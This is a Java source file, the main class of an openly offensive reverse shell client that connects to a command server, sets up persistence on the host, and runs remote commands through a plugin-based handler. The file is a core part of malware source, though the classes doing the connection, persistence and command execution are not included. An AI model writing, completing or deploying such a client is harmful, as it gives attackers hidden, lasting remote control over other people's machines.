package obs1d1anc1ph3r.reverseshell;

import obs1d1anc1ph3r.reverseshell.utils.Persistence;
import obs1d1anc1ph3r.reverseshell.plugins.PluginManager;
import obs1d1anc1ph3r.reverseshell.server.encryption.ECDHKeyExchange;

import java.io.IOException;
import java.util.logging.*;

public class ReverseShellClient {

    private static final Logger logger = Logger.getLogger(ReverseShellClient.class.getName());
    private final ServerConnection serverConnection;
    private final CommandHandler commandHandler;
    private final PluginManager pluginManager;

    private final byte[] privateKey;

    //Start the stuff, do the dependancy management and stuff, honestly an okay class, not doing more than it should
    public ReverseShellClient(String serverIp, int serverPort) {
        this.serverConnection = new ServerConnection(serverIp, serverPort);
        this.pluginManager = new PluginManager(serverConnection);
        this.commandHandler = new CommandHandler(serverConnection, pluginManager);

        this.privateKey = ECDHKeyExchange.generatePrivateKey();
	ECDHKeyExchange.generatePublicKey(privateKey);
    }

    public void start() throws Exception {
        try {
            serverConnection.connect();
            Persistence.setup();
            commandHandler.handleCommands();
        } catch (IOException e) {
            logger.log(Level.SEVERE, "Connection error: " + e.getMessage(), e);
        } finally {
            serverConnection.cleanup();
        }
    }

    public static void main(String[] args) throws Exception {
        ReverseShellClient client = new ReverseShellClient("localhost", 2222);
        client.start();
    }
}
